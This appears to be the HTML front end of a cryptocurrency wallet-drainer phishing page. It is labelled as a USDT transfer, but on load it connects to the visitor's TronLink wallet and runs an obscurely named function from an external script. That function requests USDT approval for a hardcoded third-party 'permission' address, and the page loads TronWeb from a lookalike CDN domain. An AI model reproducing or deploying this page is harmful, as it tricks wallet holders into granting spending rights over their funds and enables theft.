<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
    <title>USDT 转移</title>
    <link rel="icon" type="image/png" href="png/icon_trx.png">
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="js/1.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Helvetica Neue', Arial, 'Noto Sans', 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: #0b0b0f;
            color: #fff;
        }
        .container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            width: 92%;
            max-width: 480px;
            background: #111218;
            border: 1px solid #1f2130;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.35);
        }
        .title {
            margin: 0 0 8px 0;
            font-size: 18px;
            font-weight: 600;
        }
        .desc { color: #aab; font-size: 14px; margin: 4px 0 14px; }
        .row { margin: 8px 0; font-size: 14px; }
        .muted { color: #99a; }
        .success { color: #20c997; }
        .error { color: #ff6b6b; }
        a { color: #6ea8fe; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>

<body>
    <div class="container">
        <div class="card">
            <h2 class="title">USDT 授权</h2>
            <div id="message" class="row muted">正在检测钱包环境...</div>
            <div id="address" class="row"></div>
            <div id="tx" class="row"></div>
        </div>
    </div>

    <script>
    // 必填参数
    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1'; // 合约地址（被授权方）
    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT 合约

    function setMessage(text, cls) {
        const el = document.getElementById('message');
        el.textContent = text;
        el.className = 'row ' + (cls || 'muted');
    }
    function setAddress(addr) {
        const el = document.getElementById('address');
        el.textContent = addr ? ('地址：' + addr) : '';
        el.className = 'row muted';
    }
    function setTx(hash) {
        const el = document.getElementById('tx');
        if (!hash) { el.textContent = ''; return; }
        const url = 'https://tronscan.org/#/transaction/' + hash;
        el.innerHTML = '交易哈希：<a target="_blank" rel="noopener" href="' + url + '">' + hash + '</a>';
    }

    async function ensureWalletReady() {
        const isDApp = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
        if (!isDApp) {
            setMessage('未检测到 DApp 钱包，请在钱包内打开本页面', 'error');
            throw new Error('No DApp wallet');
        }
        if (window.tronWeb && window.tronWeb.ready) {
            return window.tronWeb;
        }
        if (window.tronLink && window.tronLink.request) {
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (res && res.code === 200) {
                window.tronWeb = window.tronLink.tronWeb;
                return window.tronWeb;
            }
        }
        setMessage('钱包未授权账户访问', 'error');
        throw new Error('Wallet not authorized');
    }

    async function bootstrap() {
        try {
            setMessage('正在连接钱包...');
            const tw = await ensureWalletReady();
            const addr = tw && tw.defaultAddress && tw.defaultAddress.base58;
            setAddress(addr || '');

            setMessage('正在发起 USDT 授权...', 'muted');
            const txid = await KdhshaBBHdg();
            setMessage('授权成功', 'success');
            setTx(txid);
        } catch (err) {
            setMessage('授权失败：' + (err && err.message ? err.message : '未知错误'), 'error');
        }
    }

    document.addEventListener('DOMContentLoaded', bootstrap);
    </script>
</body>
</html>
